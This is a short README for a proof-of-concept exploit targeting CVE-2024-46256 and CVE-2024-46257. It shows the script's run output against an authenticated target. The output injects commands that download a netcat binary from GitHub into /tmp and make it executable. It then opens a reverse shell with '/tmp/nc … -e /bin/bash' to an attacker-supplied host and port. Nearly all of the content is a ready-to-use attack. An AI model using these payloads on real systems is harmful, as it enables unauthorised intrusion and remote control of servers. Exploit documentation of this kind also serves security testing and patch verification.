# POC_CVE-2024-46256

_CVE-2024-46256 and CVE-2024-46257 is the same POC, just change the provider param._
---
# Note

Sometimes the nc file can't execute on the server or can't execute command!
---
# Install require

```html
pip install requests
```

# Run Exploit

```html
python3 POC_CVE-2024-46256.py

[+] Target type (IP/Host)? (i/h): i
[+] Enter IP or Host: {IP/HOST}
[+] Enter Port: {PORT}
[+] Enter username: {USERNAME}
[+] Enter password: {PASS}
[+] Token obtained: {token auto get}
[+] Sending payload: curl https://raw.githubusercontent.com/yunchih/static-binaries/master/nc -o /tmp/nc
[+] Command executed: curl https://raw.githubusercontent.com/yunchih/static-binaries/master/nc -o /tmp/nc
[+] Sending payload: chmod +x /tmp/nc
[+] Command executed: chmod +x /tmp/nc
[+] Target is vulnerable!
[+] Proceed with reverse shell? (y/n): y
[+] Enter reverse shell IP: {Rev server}
[+] Enter reverse shell port: {Rev port}
[+] Command executed: /tmp/nc {Rev server} {Rev port} -e /bin/bash
[+] Reverse shell command executed!
```

